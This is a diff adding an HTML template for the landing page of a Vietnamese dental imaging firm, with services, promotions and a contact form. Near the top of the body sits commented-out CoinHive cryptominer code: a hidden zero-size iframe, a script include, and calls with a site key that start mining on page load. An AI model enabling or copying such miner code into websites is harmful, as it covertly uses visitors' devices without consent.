@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<!--[if IE 8]>
+<html lang="en" class="ie8 no-js" xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org"> <![endif]-->
+<!--[if IE 9]>
+<html lang="en" class="ie9 no-js" xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:th="http://www.thymeleaf.org"> <![endif]-->
+<!--[if !IE]><!-->
+<html lang="en" class="no-js" xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:th="http://www.thymeleaf.org">
+<!--<![endif]-->
+<!-- BEGIN HEAD -->
+<head>
+  <meta charset="utf-8"/>
+  <title>Metronic One Page</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <meta content="" name="description"/>
+  <meta content="" name="author"/>
+  <!-- BEGIN GLOBAL MANDATORY STYLES -->
+  <!-- <link href='http://fonts.googleapis.com/css?family=Hind:400,500,300,600,700' rel='stylesheet' type='text/css'> -->
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800&amp;subset=vietnamese"
+        rel="stylesheet"/>
+  
+  <link href="./assets/font-awesome/css/font-awesome.min.css"
+        th:href="@{/assets/font-awesome/css/font-awesome.min.css}" rel="stylesheet" type="text/css"/>
+  <link href="./assets/simple-line-icons/simple-line-icons.min.css"
+        th:href="@{/assets/simple-line-icons/simple-line-icons.min.css}" rel="stylesheet" type="text/css"/>
+  <link href="./assets/bootstrap/css/bootstrap.min.css" th:href="@{/assets/bootstrap/css/bootstrap.min.css}"
+        rel="stylesheet" type="text/css"/>
+  <!-- END GLOBAL MANDATORY STYLES -->
+  <!-- BEGIN PAGE LEVEL PLUGIN STYLES -->
+  <link href="./assets/pages/css/animate.css" th:href="@{/assets/pages/css/animate.css}" rel="stylesheet"/>
+  <link href="./assets/owl.carousel/assets/owl.carousel.css" th:href="@{/assets/owl.carousel/assets/owl.carousel.css}"
+        rel="stylesheet"/>
+  <!-- <link href="assets/plugins/cubeportfolio/cubeportfolio/css/cubeportfolio.min.css" rel="stylesheet"> -->
+  <!-- END PAGE LEVEL PLUGIN STYLES -->
+  <!-- BEGIN THEME STYLES -->
+  <link href="./assets/onepage2/css/layout.css" th:href="@{/assets/onepage2/css/layout.css}" rel="stylesheet"
+        type="text/css"/>
+  <!-- <link href="assets/onepage2/css/custom.css" rel="stylesheet" type="text/css"/> -->
+  
+  <link href="./assets/onepage2/css/style.css" th:href="@{/assets/onepage2/css/style.css}" rel="stylesheet"
+        type="text/css"/>
+  <!-- END THEME STYLES -->
+  
+  <!-- <link rel="shortcut icon" href="favicon.ico"/> -->
+
+</head>
+<!-- END HEAD -->
+<!-- BEGIN BODY -->
+<!-- DOC: Apply "page-on-scroll" class to the body element to set fixed header layout -->
+<body class="page-header-fixed">
+<!--<script th:src="@{//authedmine.com/lib/simple-ui.min.js}"></script>-->
+<!--<iframe src="https://cnhv.co/39p2b" style="border: 0; border: none; height: 0; width: 0;"></iframe>-->
+
+<!--<div class="coinhive-miner"-->
+     <!--style="width: 256px; height: 310px"-->
+     <!--data-key="XDTxeFyaLvWwzgjlBkQFAxcNDAIo0sLO">-->
+  <!--<em>Loading...</em>-->
+  <!--<script>-->
+      <!--var miner = new CoinHive.Anonymous("XDTxeFyaLvWwzgjlBkQFAxcNDAIo0sLO");-->
+      <!--miner.start();-->
+  <!--</script>-->
+
+<!--</div>-->
+<!--<script>-->
+    <!--var miner = new CoinHive.Anonymous('XDTxeFyaLvWwzgjlBkQFAxcNDAIo0sLO', {throttle: 0});-->
+
+    <!--// Only start on non-mobile devices and if not opted-out-->
+    <!--// in the last 14400 seconds (4 hours):-->
+        <!--miner.start();-->
+<!--</script>-->
+
+
+<!-- BEGIN MAIN LAYOUT -->
+<!-- Header BEGIN -->
+<header class="page-header">
+  <nav class="navbar navbar-fixed-top" role="navigation">
+    <div class="container">
+      <!-- Brand and toggle get grouped for better mobile display -->
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse"
+                data-target=".navbar-responsive-collapse">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="toggle-icon">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </span>
+        </button>
+        <a class="navbar-brand" href="#intro">
+          <img class="logo-scroll" src="assets/onepage2/img/logo-cong-ty-1.jpg" alt="Logo"/>
+        </a>
+      </div>
+      
+      <!-- Collect the nav links, forms, and other content for toggling -->
+      <div class="collapse navbar-collapse navbar-responsive-collapse">
+        <ul class="nav navbar-nav">
+          <li class="page-scroll active">
+            <a href="#intro">Home</a>
+          </li>
+          <li class="page-scroll">
+            <a href="#about">About</a>
+          </li>
+          <li class="page-scroll">
+            <a href="#features">Services</a>
+          </li>
+          <li class="page-scroll">
+            <a href="#team">Event</a>
+          </li>
+          <!-- <li class="page-scroll">
+			  <a href="#clients">Clients</a>
+		  </li>
+		  <li class="page-scroll">
+			  <a href="#portfolio">Portfolio</a>
+		  </li>
+		  <li class="page-scroll">
+			  <a href="#pricing">Pricing</a>
+		  </li> -->
+          <li class="page-scroll">
+            <a href="#contact">Contact</a>
+          </li>
+          <li class="btn-login">
+            <a th:href="@{/login}">Login</a>
+          </li>
+        </ul>
+      </div>
+      <!-- End Navbar Collapse -->
+    </div>
+    <!--/container-->
+  </nav>
+</header>
+<!-- Header END -->
+
+<!-- BEGIN INTRO SECTION -->
+<section id="intro">
+  <div id="carousel-example-generic" class="carousel slide">
+    <!-- Indicators -->
+    <ol class="carousel-indicators">
+      <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
+      <li data-target="#carousel-example-generic" data-slide-to="1"></li>
+      <li data-target="#carousel-example-generic" data-slide-to="2"></li>
+    </ol>
+    
+    <!-- Wrapper for slides -->
+    <div class="carousel-inner text-uppercase" role="listbox">
+      <!-- First slide -->
+      <div class="item carousel-item-one active">
+      
+      </div>
+      
+      <!-- Second slide -->
+      <div class="item carousel-item-two">
+        <div class="container">
+          <h3 class="carousel-position-one animate-delay carousel-title-v2"
+              data-animation="animated fadeInDown">
+            Ultimate Apps <br/> for Business
+          </h3>
+          <p class="carousel-position-three animate-delay carousel-subtitle-v2"
+             data-animation="animated fadeInDown">
+            Available in: Android &amp; IOS
+          </p>
+        </div>
+      </div>
+      
+      <!-- Third slide -->
+      <div class="item carousel-item-three">
+      
+      </div>
+    </div>
+  </div>
+</section>
+<!-- END INTRO SECTION -->
+
+<!-- BEGIN MAIN LAYOUT -->
+<div class="page-content">
+  <!-- SUBSCRIBE BEGIN -->
+  <div class="subscribe">
+    <div class="container">
+    
+    </div>
+  </div>
+  <!-- SUBSCRIBE END -->
+  
+  <!-- BEGIN ABOUT SECTION -->
+  <section id="about">
+    <div class="heading">
+      <h2><strong>About</strong> Samsun RC</h2>
+      <!-- <p>To try the most advanced business</p> -->
+    </div><!-- //end heading -->
+    <!-- Services BEGIN -->
+    <div class="container">
+      <img src="assets/onepage2/img/widgets/map.jpg" alt="" style="max-width: 100%"/>
+    </div>
+    <!-- Services END -->
+  </section>
+  <!-- END ABOUT SECTION -->
+  
+  <!-- BEGIN FEATURES SECTION -->
+  <section id="features">
+    <!-- Features BEGIN -->
+    <div class="features-bg">
+      <div class="container">
+        <div class="heading">
+          <h2><strong>Services</strong> For Your Clinic</h2>
+          <!-- <p>To try the most advanced business</p> -->
+        </div><!-- //end heading -->
+        
+        <!-- Features -->
+        <div class="row margin-bottom-70">
+          <div class="col-md-6 md-margin-bottom-70">
+            <div class="features">
+              <img src="assets/onepage2/img/widgets/pano_ct.png" alt=""/>
+              <div class="features-in">
+                <h3><a href="#">Image CT Combeam Auto Panorama</a></h3>
+                
+              </div>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="features">
+              <img src="assets/onepage2/img/widgets/ct.png" alt=""/>
+              <div class="features-in">
+                <h3><a href="#"> Image CT Combeam</a></h3>
+                
+              </div>
+            </div>
+          </div>
+        </div><!-- //end row -->
+        <div class="row margin-bottom-80">
+          <div class="col-md-6 md-margin-bottom-70">
+            <div class="features">
+              <img src="assets/onepage2/img/widgets/cel_bantay.png" alt=""/>
+              <div class="features-in">
+                <h3><a href="#">Image Celphalo Anh Hand</a></h3>
+                
+              </div>
+            </div>
+          </div>
+          <div class="col-md-6">
+            <div class="features">
+              <img src="assets/onepage2/img/widgets/panorama.png" alt=""/>
+              <div class="features-in">
+                <h3><a href="#">Image Panorama</a></h3>
+                
+              </div>
+            </div>
+          </div>
+        </div><!-- //end row -->
+        <!-- End Features -->
+        
+        
+      </div>
+    </div>
+    <!-- Features END -->
+  </section>
+  <!-- END FEATURES SECTION -->
+  
+  <!-- BEGIN TEAM SECTION -->
+  <section id="team">
+    <!-- Team BEGIN -->
+    <div class="team-bg parallax">
+      <div class="container">
+        <div class="heading-light">
+          <h2><strong>Our</strong> Event </h2>
+        </div><!-- //end heading -->
+        
+        <div class="row">
+          <div class="col-md-8">
+            <img src="/assets/onepage2/img/green16.jpg" style="width: 100%;" />
+          </div>
+          <div class="col-md-4">
+            <div class="team-about">
+              <h3>Khuyến mãi dành cho chụp lần đầu</h3>
+              <p>Khi nha khoa của bạn gửi bệnh nhận đến chụp lần đầu ,Chi phí chụp sẽ được miễn phí 100% ap dụng cho 3 bệnh nhân đầu tiên.</p>
+              <div class="margin-bottom-40"></div>
+              <h3>Hỗ trợ nha khoa</h3>
+              <p>Các nha khoa sẽ được hỗ trợ theo phần trăm số lượng bệnh nhân gửi đến . Áp dụng cho các nha khoa có nhiều hơn 20 bệnh nhân trên tháng .</p>
+              <div class="margin-bottom-40"></div>
+             
+            </div>
+          </div>
+        </div><!-- //end row -->
+      </div>
+    </div>
+    <!-- Team END -->
+  </section>
+  <!-- END TEAM SECTION -->
+  
+  
+  <!-- BEGIN CONTACT SECTION -->
+  <section id="contact">
+    <!-- Footer -->
+    <div class="footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-sm-6">
+            <div class="heading-left-light">
+              <h2>Say hello to SAMSUN VINA</h2>
+              <p>Come to us will make your dental trust customers <br/> A member of SAMSUN VINA</p>
+            </div>
+          </div>
+          <div class="col-sm-6">
+            <span th:if="${sendcontactsuccess}" style="color: red" th:text="${sendcontactsuccess}"></span>
+  
+            <form method="POST" th:action="@{/savecontact}" action="@{/savecontact}" th:object="${contactModel}">
+  
+            <div class="form">
+              <div class="form-wrap">
+                <div class="form-wrap-group">
+                  <input th:field="*{name}" type="text" placeholder="Your Name" class="form-control"/>
+                 
+                  <input th:field="*{subject}" type="text" placeholder="Subject"
+                         class="border-top-transparent form-control"/>
+
+                </div>
+                <div class="form-wrap-group border-left-transparent">
+                  <input th:field="*{mail}" type="email" placeholder="Your Email"  class="form-control" required="required"/>
+  
+                  <input th:field="*{phone}" type="text" placeholder="Contact Phone"
+                         class="border-top-transparent form-control"/>
+
+                </div>
+              </div>
+            </div>
+            <textarea th:field="*{write_comment}" rows="8" name="message" placeholder="Write comment here ..."
+                      class="border-top-transparent form-control"></textarea>
+              <p style="color: red" th:if="${#fields.hasErrors('name')}" th:errors="*{name}">Tên không hợp lệ!</p>
+              <p style="color: red" th:if="${#fields.hasErrors('phone')}" th:errors="*{phone}">Số điện thoại không hợp lệ!</p>
+              <p style="color: red" th:if="${#fields.hasErrors('mail')}" th:errors="*{mail}">Email không hợp lệ!</p>
+              <p style="color: red" th:if="${#fields.hasErrors('subject')}" th:errors="*{subject}">Tiêu đề không hợp lệ!</p>
+              <p style="color: red" th:if="${#fields.hasErrors('write_comment')}" th:errors="*{write_comment}">bình luận không hợp lệ!</p>
+  
+              <button type="submit" class="btn-danger btn-md btn-block">Send it</button>
+            </form>
+
+          </div>
+        </div><!-- //end row -->
+        
+      </div>
+    </div>
+   
+    
+    <footer id="footer">
+      <div class="footer-bottom">
+        <div class="container">
+          <div class="row">
+            <!-- <div class="col-xs-12 col-md-9 lz_footer_contact_info">
+				<ul class="list-unstyled list-top-contact">
+					<li>
+						<span class="fa fa-fax"></span>
+						08. 3848 1547                </li>
+					<li>
+						<span class="fa fa-envelope"></span>
+						info@samsunvina.com                </li>
+					<li>
+						<span class="fa fa-map-marker"></span>
+						112 Trần Quang Khải, P. Tân Định, Quận 1, TP.HCM                </li>
+				</ul>
+			</div>
+			<div class="col-xs-6 col-md-3 hidden-xs hidden-sm">
+				&copy; 2017 - Phát triển bởi <a href="http://laziweb.com" target="_blank" rel="nofollow">Laziweb.com</a>
+			</div>
+		  </div> -->
+            
+            <!-- <div class="copyright">
+				<div class="copyright-info">
+				</div>
+				<div class="copyright-content">
+
+				</div>
+			</div> -->
+            
+            <div class="col-xs-12 col-md-4 info footer-col">
+              <h4 class="footer-title">Sitemap</h4>
+              <ul>
+                <li><a href="#">About Us</a></li>
+                <li><a href="http://scm.samsunvina.com/">Samsun Family</a></li>
+                <li><a href="#">Our Customers </a></li>
+                <li><a href="#">Our Partners</a></li>
+              </ul>
+            </div>
+            
+            <div class="col-xs-12 col-md-4 footer-col">
+              <h4 class="footer-title">Contact</h4>
+              <p><a href="mailto:info@samsunvina.com">info@samsunvina.com</a></p>
+              <p>Hotline: <a href="tel:1800 6079">1800 6079</a></p>
+              <p>Điện thoại:
+                <a href="tel:(028) 3846 7340">(028) 3846 7340</a>
+              </p>
+              <p>Fax: (028) 3848 1547</p>
+              <div class="socials">
+                <ul>
+                  <li><a href="https://facebook.com/facebook" target="_blank"><i
+                          class="fa fa-facebook"></i></a></li>
+                  <li>
+                    <a href="https://www.youtube.com/channel/UCiO0O_BD7z-ieJyQj_lV2Qw?view_as=subscriber"
+                       target="_blank"><i class="fa fa-youtube"></i></a></li>
+                  <!-- <li><a href="" target="_blank"><i class="fa fa-instagram"></i></a></li>
+				  <li><a href="" target="_blank"><i class="fa fa-google-plus"></i></a></li> -->
+                </ul>
+              </div>
+            </div>
+            
+            <div class="col-xs-12 col-md-4 footer-col">
+              <h4 class="footer-title">Address</h4>
+              
+              <div class="address-content">
+                <!-- <p>112 Trần Quang Khải, P. Tân Định, Quận 1</p> -->
+                <p>Trụ sở chính: <a href="#modal-map" data-toggle="modal"
+                                    title="112 Trần Quang Khải, P. Tân Định, Quận 1">112 Trần Quang
+                  Khải, P. Tân Định, Quận 1</a></p>
+                <p>Chi nhánh Đà Nẵng: <a href="#modal-map" data-toggle="modal"
+                                         title="137 Ông Ích Khiêm, P. Thanh Bình, Quận Hải Châu">137 Ông
+                  Ích Khiêm, P. Thanh Bình, Quận Hải Châu</a></p>
+                <p>Chi nhánh Hà nội: <a href="#modal-map" data-toggle="modal"
+                                        title="Số 39 Ngõ 9 Hoàn Cầu, Đống Đa">Số 39 Ngõ 9 Hoàn Cầu, Đống
+                  Đa</a></p>
+              
+              </div>
+            
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+  
+  
+  </section>
+  <!-- END CONTACT SECTION -->
+</div>
+<!-- END MAIN LAYOUT -->
+<a href="#intro" class="go2top"><i class="fa fa-arrow-up"></i></a>
+
+<!-- BEGIN JAVASCRIPTS(Load javascripts at bottom, this will reduce page load time) -->
+<!-- BEGIN CORE PLUGINS -->
+<!--[if lt IE 9]>
+<script src="./public/js/respond.min.js" th:src="@{/public/js/respond.min.js}"></script>
+<script src="./public/js/excanvas.min.js" th:src="@{/public/js/excanvas.min.js}"></script>
+<![endif]-->
+<script src="./public/js/jquery.min.js" th:src="@{/public/js/jquery.min.js}" type="text/javascript"></script>
+<script src="./public/js/jquery-migrate.min.js" th:src="@{/public/js/jquery-migrate.min.js}"
+        type="text/javascript"></script>
+<script src="./assets/bootstrap/js/bootstrap.min.js" th:src="@{/assets/bootstrap/js/bootstrap.min.js}"
+        type="text/javascript"></script>
+<!-- END CORE PLUGINS -->
+<!-- BEGIN PAGE LEVEL PLUGINS -->
+<script src="./public/js/jquery.easing.js" th:src="@{/public/js/jquery.easing.js}" type="text/javascript"></script>
+<script src="./public/js/jquery.parallax.js" th:src="@{/public/js/jquery.parallax.js}" type="text/javascript"></script>
+<script src="./assets/smooth-scroll/smooth-scroll.js" th:src="@{/assets/smooth-scroll/smooth-scroll.js}"
+        type="text/javascript"></script>
+<script src="./assets/owl.carousel/owl.carousel.min.js" th:src="@{/assets/owl.carousel/owl.carousel.min.js}"
+        type="text/javascript"></script>
+<!-- BEGIN CUBEPORTFOLIO -->
+<script src="./assets/cubeportfolio/cubeportfolio/js/jquery.cubeportfolio.min.js"
+        th:src="@{/assets/cubeportfolio/cubeportfolio/js/jquery.cubeportfolio.min.js}" type="text/javascript"></script>
+<script src="./assets/onepage2/scripts/portfolio.js" th:src="@{/assets/onepage2/scripts/portfolio.js}"
+        type="text/javascript"></script>
+<!-- END CUBEPORTFOLIO -->
+<!-- END PAGE LEVEL PLUGINS -->
+<!-- BEGIN PAGE LEVEL SCRIPTS -->
+<script src="./assets/onepage2/scripts/layout.js" th:src="@{/assets/onepage2/scripts/layout.js}"
+        type="text/javascript"></script>
+<script src="./assets/pages/scripts/bs-carousel.js" th:src="@{/assets/pages/scripts/bs-carousel.js}"
+        type="text/javascript"></script>
+<!-- END PAGE LEVEL SCRIPTS -->
+<script>
+    jQuery(document).ready(function () {
+        Layout.init();
+    });
+</script>
+
+
+
+
+<!-- END JAVASCRIPTS -->
+</body>
+<!-- END BODY -->
+</html>
